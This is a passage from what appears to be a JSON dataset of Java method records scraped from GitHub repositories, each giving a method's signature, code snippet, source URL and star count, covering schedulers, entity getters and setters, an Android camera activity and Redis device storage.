"modifiers": ["public"], "return_type": "void", "snippet": "    public void cancel() throws Exception {\n//        super.cancel();\n        LinkisNodeExecutionImpl.getLinkisNodeExecution().cancel(this.job);\n        isCanceled = true;\n        warn(\"This job has been canceled\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/AzkabanDssJobType.java", "stars": "18", "class_props": {"extends": "AbstractJob", "implements": null, "modifiers": ["public"]}}, {"id": 32293, "method_name": "isCanceled", "class_name": "AzkabanDssJobType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCanceled() {\n        return isCanceled;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/AzkabanDssJobType.java", "stars": "18", "class_props": {"extends": "AbstractJob", "implements": null, "modifiers": ["public"]}}, {"id": 32294, "method_name": "getProgress", "class_name": "AzkabanDssJobType", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "double", "snippet": "    public double getProgress() throws Exception {\n        return   LinkisNodeExecutionImpl.getLinkisNodeExecution().getProgress(this.job);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/AzkabanDssJobType.java", "stars": "18", "class_props": {"extends": "AbstractJob", "implements": null, "modifiers": ["public"]}}, {"id": 32295, "method_name": "logJobProperties", "class_name": "AzkabanDssJobType", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void logJobProperties() {\n        if (this.jobProps != null &&\n                this.jobProps.getBoolean(JOB_DUMP_PROPERTIES_IN_LOG, true)) {\n            try {\n                this.info(\"******   Job properties   ******\");\n                this.info(String.format(\"- Note : value is masked if property name ends with '%s'.\",\n                        SENSITIVE_JOB_PROP_NAME_SUFFIX));\n                for (final Map.Entry<String, String> entry : this.jobPropsMap.entrySet()) {\n                    final String key = entry.getKey();\n                    final String value = key.endsWith(SENSITIVE_JOB_PROP_NAME_SUFFIX) ?\n                            SENSITIVE_JOB_PROP_VALUE_PLACEHOLDER :\n                            entry.getValue();\n                    this.info(String.format(\"%s=%s\", key, value));\n                }\n                this.info(\"****** End Job properties  ******\");\n            } catch (final Exception ex) {\n                this.log.error(\"failed to log job properties \", ex);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/AzkabanDssJobType.java", "stars": "18", "class_props": {"extends": "AbstractJob", "implements": null, "modifiers": ["public"]}}, {"id": 32296, "method_name": "run", "class_name": "ClockDaemon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        TimeUnit unit = timeUnit;\n        long timeStamp = System.currentTimeMillis();\n        try {\n            if(null != listener && timeoutDuration > 0){\n                if(null == unit){\n                    unit = TimeUnit.SECONDS;\n                }\n                long clock = System.currentTimeMillis();\n                int count = 0;\n                while(!exec.tryLock(timeoutDuration, unit)){\n                    //The task is timeout, invoke the listener\n                    try {\n                        listener.handle(taskProcess, \"RUN \" +\n                                TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - clock)\n                                + \" \" +unit.name());\n                        if(++ count >= 3){\n                            break;\n                        }\n                    }catch(Exception e){\n                        logger.error(\"Notify server task {} timeout error\", TaskProcessUtils.getTaskId(taskProcess), e);\n                    }\n                    exec.lock();\n                }\n            }else{\n                exec.lock();\n            }\n        } catch (InterruptedException e) {\n            logger.error(e.getMessage(), e);\n            Thread.currentThread().interrupt();\n        } finally{\n           if(exec.isHeldByCurrentThread()){\n               exec.unlock();\n               if(logger.isInfoEnabled()) {\n                   logger.info(\"Task finished, spent time in seconds: {}\",\n                           TimeUnit.SECONDS.convert(System.currentTimeMillis() - timeStamp, TimeUnit.MILLISECONDS));\n               }\n           }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/daemons/ClockDaemon.java", "stars": "23", "class_props": {"extends": "AbstractTaskDaemon", "implements": null, "modifiers": ["public"]}}, {"id": 32297, "method_name": "getId", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32298, "method_name": "setId", "class_name": "Comments", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Long id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32299, "method_name": "getpId", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getpId() {\n        return pId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32300, "method_name": "setpId", "class_name": "Comments", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setpId(Long pId) {\n        this.pId = pId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32301, "method_name": "getcId", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getcId() {\n        return cId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32302, "method_name": "setcId", "class_name": "Comments", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setcId(Long cId) {\n        this.cId = cId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32303, "method_name": "getArticleTitle", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getArticleTitle() {\n        return articleTitle;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32304, "method_name": "setArticleTitle", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setArticleTitle(String articleTitle) {\n        this.articleTitle = articleTitle;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32305, "method_name": "getArticleId", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getArticleId() {\n        return articleId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32306, "method_name": "setArticleId", "class_name": "Comments", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setArticleId(Long articleId) {\n        this.articleId = articleId;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32307, "method_name": "getName", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32308, "method_name": "setName", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32309, "method_name": "getcName", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getcName() {\n        return cName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32310, "method_name": "setcName", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setcName(String cName) {\n        this.cName = cName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32311, "method_name": "getTime", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getTime() {\n        return time;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32312, "method_name": "setTime", "class_name": "Comments", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTime(Long time) {\n        this.time = time;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32313, "method_name": "getEmail", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEmail() {\n        return email;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32314, "method_name": "setEmail", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEmail(String email) {\n        this.email = email;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32315, "method_name": "getUrl", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUrl() {\n        return url;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32316, "method_name": "setUrl", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUrl(String url) {\n        this.url = url;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32317, "method_name": "getType", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32318, "method_name": "setType", "class_name": "Comments", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(Integer type) {\n        this.type = type;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32319, "method_name": "getIp", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIp() {\n        return ip;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32320, "method_name": "setIp", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIp(String ip) {\n        this.ip = ip;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32321, "method_name": "getDevice", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDevice() {\n        return device;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32322, "method_name": "setDevice", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDevice(String device) {\n        this.device = device;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32323, "method_name": "getAddress", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAddress() {\n        return address;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32324, "method_name": "setAddress", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAddress(String address) {\n        this.address = address;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32325, "method_name": "getContent", "class_name": "Comments", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContent() {\n        return content;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32326, "method_name": "setContent", "class_name": "Comments", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(String content) {\n        this.content = content;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Comments.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32327, "method_name": "start", "class_name": "CameraActivity", "params": ["BaseActivity", "OnCameraListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void start(BaseActivity activity, OnCameraListener listener) {\n        File file = createCameraFile();\n        Intent intent = new Intent(activity, CameraActivity.class);\n        intent.putExtra(IntentKey.FILE, file);\n        activity.startActivityForResult(intent, (resultCode, data) -> {\n\n            if (listener == null) {\n                return;\n            }\n\n            if (resultCode == RESULT_OK) {\n                listener.onSelected(file);\n            } else {\n                listener.onCancel();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32328, "method_name": "getLayoutId", "class_name": "CameraActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32329, "method_name": "initView", "class_name": "CameraActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32330, "method_name": "initData", "class_name": "CameraActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {\n        // \u542f\u52a8\u7cfb\u7edf\u76f8\u673a\n        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n        if (XXPermissions.isHasPermission(this, Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.CAMERA)\n                && intent.resolveActivity(getPackageManager()) != null) {\n            mFile = getSerializable(IntentKey.FILE);\n            if (mFile != null && mFile.exists()) {\n\n                Uri imageUri;\n                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                    // \u901a\u8fc7 FileProvider \u521b\u5efa\u4e00\u4e2a Content \u7c7b\u578b\u7684 Uri \u6587\u4ef6\n                    imageUri = FileProvider.getUriForFile(this, AppConfig.getPackageName() + \".provider\", mFile);\n                } else {\n                    imageUri = Uri.fromFile(mFile);\n                }\n                // \u5bf9\u76ee\u6807\u5e94\u7528\u4e34\u65f6\u6388\u6743\u8be5 Uri \u6240\u4ee3\u8868\u7684\u6587\u4ef6\n                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n                // \u5c06\u62cd\u53d6\u7684\u7167\u7247\u4fdd\u5b58\u5230\u6307\u5b9a Uri\n                intent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri);\n                startActivityForResult(intent, CAMERA_REQUEST_CODE);\n            } else {\n                toast(R.string.photo_picture_error);\n                finish();\n            }\n        } else {\n            toast(R.string.photo_launch_fail);\n            finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32331, "method_name": "onActivityResult", "class_name": "CameraActivity", "params": ["int", "int", "Intent"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {\n        super.onActivityResult(requestCode, resultCode, data);\n        if (requestCode == CAMERA_REQUEST_CODE) {\n            switch (resultCode) {\n                case RESULT_OK:\n                    // \u91cd\u65b0\u626b\u63cf\u591a\u5a92\u4f53\uff08\u5426\u5219\u53ef\u80fd\u626b\u63cf\u4e0d\u5230\uff09\n                    MediaScannerConnection.scanFile(getApplicationContext(), new String[]{mFile.getPath()}, null,null);\n                    break;\n                case RESULT_CANCELED:\n                    // \u5220\u9664\u8fd9\u4e2a\u6587\u4ef6\n                    mFile.delete();\n                    break;\n                default:\n                    break;\n            }\n            setResult(resultCode);\n            finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32332, "method_name": "createCameraFile", "class_name": "CameraActivity", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "File", "snippet": "    private static File createCameraFile() {\n        File folder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), \"Camera\");\n        if (!folder.exists() || !folder.isDirectory()) {\n            if (!folder.mkdirs()) {\n                folder = Environment.getExternalStorageDirectory();\n            }\n        }\n\n        try {\n            File file = new File(folder, \"IMG_\" + new SimpleDateFormat(\"yyyyMMdd_kkmmss\", Locale.getDefault()).format(new Date()) + \".jpg\");\n            file.createNewFile();\n            return file;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/CameraActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32333, "method_name": "exists", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean exists(String deviceId) {\n\t\treturn redis.hasKey(VideoManagerConstants.CACHEKEY_PREFIX+deviceId);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32334, "method_name": "create", "class_name": "VideoManagerRedisStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean create(Device device) {\n\t\treturn redis.set(VideoManagerConstants.CACHEKEY_PREFIX+device.getDeviceId(), device);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32335, "method_name": "update", "class_name": "VideoManagerRedisStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean update(Device device) {\n\t\treturn redis.set(VideoManagerConstants.CACHEKEY_PREFIX+device.getDeviceId(), device);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32336, "method_name": "queryVideoDevice", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Device", "snippet": "\tpublic Device queryVideoDevice(String deviceId) {\n\t\treturn (Device)redis.get(VideoManagerConstants.CACHEKEY_PREFIX+deviceId);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32337, "method_name": "queryVideoDeviceList", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Device>", "snippet": "\tpublic List<Device> queryVideoDeviceList(String[] deviceIds) {\n\t\tList<Device> devices = new ArrayList<>();\n\t\tif (deviceIds == null || deviceIds.length == 0) {\n\t\t\tList<Object> deviceIdList = redis.keys(VideoManagerConstants.CACHEKEY_PREFIX+\"*\");\n\t\t\tfor (int i = 0; i < deviceIdList.size(); i++) {\n\t\t\t\tdevices.add((Device)redis.get((String)deviceIdList.get(i)));\n\t\t\t}\n\t\t} else {\n\t\t\tfor (int i = 0; i < deviceIds.length; i++) {\n\t\t\t\tdevices.add((Device)redis.get(VideoManagerConstants.CACHEKEY_PREFIX+deviceIds[i]));\n\t\t\t}\n\t\t}\n\t\treturn devices;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32338, "method_name": "delete", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean delete(String deviceId) {\n\t\tredis.del(VideoManagerConstants.CACHEKEY_PREFIX+deviceId);\n\t\treturn true;  \n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32339, "method_name": "online", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean online(String deviceId) {\n\t\tDevice device = (Device)redis.get(VideoManagerConstants.CACHEKEY_PREFIX+deviceId);\n\t\tdevice.setOnline(1);\n\t\treturn redis.set(VideoManagerConstants.CACHEKEY_PREFIX+device.getDeviceId(), device);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32340, "method_name": "outline", "class_name": "VideoManagerRedisStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean outline(String deviceId) {\n\t\tDevice device = (Device)redis.get(VideoManagerConstants.CACHEKEY_PREFIX+deviceId);\n\t\tdevice.setOnline(0);\n\t\treturn redis.set(VideoManagerConstants.CACHEKEY_PREFIX+device.getDeviceId(), device);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/redis/VideoManagerRedisStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 32341, "method_name": "dispose", "class_name": "SecurityAuthenticatedComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispose() {\n\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityAuthenticatedComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 32342, "method_name": "getMessageArray", "class_name": "SecurityAuthenticatedComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object[] getMessageArray() {\n        return this.data.toArray();\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityAuthenticatedComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 32343, "method_name": "main", "class_name": "Demo02Calendar", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        demo04();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo04/Calendar/Demo02Calendar.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32344, "method_name": "demo04", "class_name": "Demo02Calendar", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void demo04() {\n        //\u4f7f\u7528getInstance\u65b9\u6cd5\u83b7\u53d6Calendar\u5bf9\u8c61\n        Calendar c = Calendar.getInstance();\n\n        Date date = c.getTime();\n        System.out.println(date);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo04/Calendar/Demo02Calendar.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32345, "method_name": "demo03", "class_name": "Demo02Calendar", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void demo03() {\n        //\u4f7f\u7528getInstance\u65b9\u6cd5\u83b7\u53d6Calendar\u5bf9\u8c61\n        Calendar c = Calendar.getInstance();\n\n        //\u628a\u5e74\u589e\u52a02\u5e74\n        c.add(Calendar.YEAR,2);\n        //\u628a\u6708\u4efd\u51cf\u5c113\u4e2a\u6708\n        c.add(Calendar.MONTH,-3);\n\n\n        int year = c.get(Calendar.YEAR);\n        System.out.println(year);\n\n        int month = c.get(Calendar.MONTH);\n        System.out.println(month);//\u897f\u65b9\u7684\u6708\u4efd0-11 \u4e1c\u65b9:1-12\n\n        //int date = c.get(Calendar.DAY_OF_MONTH);\n        int date = c.get(Calendar.DATE);\n        System.out.println(date);\n    }", "url": 